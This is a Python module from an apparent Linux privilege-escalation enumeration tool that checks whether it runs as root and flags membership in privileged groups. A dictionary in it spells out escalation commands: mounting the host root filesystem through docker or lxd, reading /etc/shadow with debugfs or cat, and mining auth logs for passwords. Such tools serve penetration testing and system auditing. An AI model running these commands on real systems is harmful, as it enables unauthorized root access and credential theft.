"""
Privileges Enumerator
=====================

Enumerate current user privileges and group memberships.
"""

import os
import pwd
import grp
from typing import Dict, List, Tuple

from ..core.base import BaseEnumerator
from ..core.findings import FindingSeverity


class PrivilegesEnumerator(BaseEnumerator):
    """
    Enumerate current user context and privilege level.

    Checks:
    - Current UID/GID
    - Group memberships
    - Privileged group membership (docker, lxd, disk, etc.)
    """

    name = "Current Privileges Enumerator"
    description = "Assess current user privilege level and group memberships"

    # Group exploitation techniques
    GROUP_EXPLOITS: Dict[str, str] = {
        'docker': (
            'Mount host filesystem in container:\n'
            '  docker run -v /:/mnt -it alpine chroot /mnt sh'
        ),
        'lxd': (
            'Create privileged container with host filesystem:\n'
            '  lxc init ubuntu:18.04 privesc -c security.privileged=true\n'
            '  lxc config device add privesc host-root disk source=/ path=/mnt/root\n'
            '  lxc start privesc\n'
            '  lxc exec privesc -- /bin/sh'
        ),
        'disk': (
            'Direct read/write to disk devices:\n'
            '  debugfs /dev/sda1\n'
            '  debugfs: cat /etc/shadow'
        ),
        'video': (
            'Access framebuffer for screen capture:\n'
            '  cat /dev/fb0 > screenshot.raw'
        ),
        'adm': (
            'Read system logs:\n'
            '  cat /var/log/auth.log  # May contain passwords'
        ),
        'sudo': (
            'Check sudo permissions:\n'
            '  sudo -l'
        ),
        'wheel': (
            'May have sudo access:\n'
            '  sudo -l'
        ),
        'admin': (
            'May have administrative privileges:\n'
            '  sudo -l'
        ),
        'shadow': (
            'Read password hashes:\n'
            '  cat /etc/shadow'
        )
    }

    def enumerate(self) -> None:
        """Run privilege enumeration"""
        self.print_header()

        # Check if already root
        is_root = self._check_root()

        if is_root:
            self.log("Already running as root!", "success")
            self.add_finding(
                category="Current Privileges",
                severity=FindingSeverity.INFO,
                finding="Already running as root",
                exploitation="N/A - Already privileged",
                impact="None - mission accomplished"
            )
            return

        # Get current user info
        user_info = self._get_user_info()

        # Check group memberships
        self._check_privileged_groups(user_info['groups'])

    def _check_root(self) -> bool:
        """Check if running as root"""
        return os.getuid() == 0

    def _get_user_info(self) -> Dict:
        """Get current user information"""
        uid = os.getuid()
        gid = os.getgid()

        try:
            username = pwd.getpwuid(uid).pw_name
        except KeyError:
            username = str(uid)

        try:
            groupname = grp.getgrgid(gid).gr_name
        except KeyError:
            groupname = str(gid)

        # Get all groups
        groups = self._get_groups()

        self.log(f"Current User: {username} (UID: {uid})")
        self.log(f"Primary Group: {groupname} (GID: {gid})")
        self.log(f"Groups: {', '.join(groups)}")

        return {
            'uid': uid,
            'gid': gid,
            'username': username,
            'groupname': groupname,
            'groups': groups
        }

    def _get_groups(self) -> List[str]:
        """Get list of groups for current user"""
        output = self.run_command('groups')
        if output:
            # Handle "username : group1 group2" format
            if ':' in output:
                output = output.split(':')[1]
            return output.strip().split()
        return []

    def _check_privileged_groups(self, groups: List[str]) -> None:
        """Check for membership in privileged groups"""
        for group in groups:
            if self.config.is_privileged_group(group):
                # Determine severity based on group
                if group in ('docker', 'lxd', 'disk', 'shadow'):
                    severity = FindingSeverity.CRITICAL
                    impact = "Critical - Direct root access possible"
                elif group in ('sudo', 'wheel', 'admin'):
                    severity = FindingSeverity.HIGH
                    impact = "High - Potential sudo access"
                else:
                    severity = FindingSeverity.MEDIUM
                    impact = "Medium - Elevated privileges"

                self.log(f"Member of privileged group: {group}", "success")

                exploitation = self.GROUP_EXPLOITS.get(
                    group,
                    "Research group-specific exploitation techniques"
                )

                self.add_finding(
                    category="Privileged Group Membership",
                    severity=severity,
                    finding=f"User is member of {group} group",
                    exploitation=exploitation,
                    impact=impact,
                    target=group,
                    group=group
                )